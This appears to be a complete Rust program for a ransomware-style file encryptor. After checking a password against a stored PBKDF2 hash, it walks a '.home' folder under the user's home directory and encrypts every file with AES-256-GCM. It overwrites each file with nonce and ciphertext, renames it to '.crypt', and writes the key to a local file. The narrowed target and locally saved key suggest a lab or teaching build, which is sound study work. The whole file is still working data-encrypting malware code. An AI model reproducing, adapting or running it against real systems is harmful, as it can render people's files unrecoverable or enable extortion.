use std::env;
use std::fs::{self, File};
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process;

use aes_gcm::aead::Aead;
use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{KeyInit, OsRng},
};
use pbkdf2::{
    Pbkdf2,
    password_hash::{PasswordHash, PasswordVerifier},
};

fn main() {
    // Store password hash
    const STORED_HASH: &str = "$pbkdf2-sha256$i=600000,l=32$xnmJ40GIbyd8qnPS40c/5g$W3u+OKQtzpZIabIWQpcBKGFUNqPC9B9JCWeBmXQVfN0";

    // Parse command line arguments
    let args: Vec<String> = env::args().collect();

    // Check command line argument length
    if args.len() < 2 {
        eprintln!(":: [-] :: Password was not provided");
        process::exit(1);
    }

    // Verify parsed passsword hash
    let parsed_hash = PasswordHash::new(STORED_HASH).unwrap();
    if Pbkdf2
        .verify_password(args[1].as_bytes(), &parsed_hash)
        .is_err()
    {
        eprintln!(":: [-] :: Password incorrect");
        process::exit(1);
    }

    // Get `HOME` directory
    let mut path = if cfg!(target_os = "windows") {
        env::var_os("USERPROFILE").map(PathBuf::from)
    } else {
        env::var_os("HOME").map(PathBuf::from)
    }
    .unwrap_or_else(|| {
        eprintln!(":: [-] :: Could not determine home directory");
        std::process::exit(1);
    });

    // Append `.home/` to avoid encrypting `HOME`
    path.push(".home");

    // Discover files
    let files = discover_files(&path).unwrap_or_else(|err| {
        eprintln!(":: [-] :: {}", err);
        process::exit(1);
    });

    // Generate random encryption key
    let key = Aes256Gcm::generate_key(OsRng);

    // Save encryption key to a file
    let key_file = Path::new("encryption.key");
    fs::write(key_file, key).unwrap();

    println!(":: [i] :: Encryption key file :: {:?}", &key_file);

    // Iterate over files
    for file in files {
        // Read file contents
        let content_res = fs::read(&file);
        let content = match content_res {
            Ok(res) => res,
            Err(err) => {
                eprintln!(":: [-] :: Content :: {}", err);
                return;
            }
        };

        // Generate random nonce bytes
        let nonce_bytes = rand::random::<[u8; 12]>();
        let nonce = Nonce::from_slice(&nonce_bytes); // 96-bits, unique per message

        // Encrypt plain text
        let cipher = Aes256Gcm::new(&key);
        let ciphertext = cipher
            .encrypt(nonce, content.as_ref())
            .expect(":: [-] :: Encrypt plain text");

        // Create encrypted file
        let mut out_path = file.clone();
        out_path.set_extension("crypt");

        // Rename original file
        fs::rename(&file, &out_path).expect(":: [-] :: Rename original file");

        // Overwrite renamed file
        let mut file = File::create(&out_path).expect(":: [-] :: Create file");

        // Write `nonce` and `ciphertext` to file
        file.write_all(&nonce_bytes).expect(":: [-] :: Write nonce");
        file.write_all(&ciphertext)
            .expect(":: [-] :: Write ciphertext");

        println!(":: [+] :: Encrypted file :: {:?}", &out_path);
    }
}

// Discover files
fn discover_files(path: &PathBuf) -> io::Result<Vec<PathBuf>> {
    let mut files = Vec::new();
    let entries = fs::read_dir(path)?;

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            let mut sub_files = discover_files(&path)?;
            files.append(&mut sub_files);
        } else {
            files.push(path);
        }
    }

    Ok(files)
}
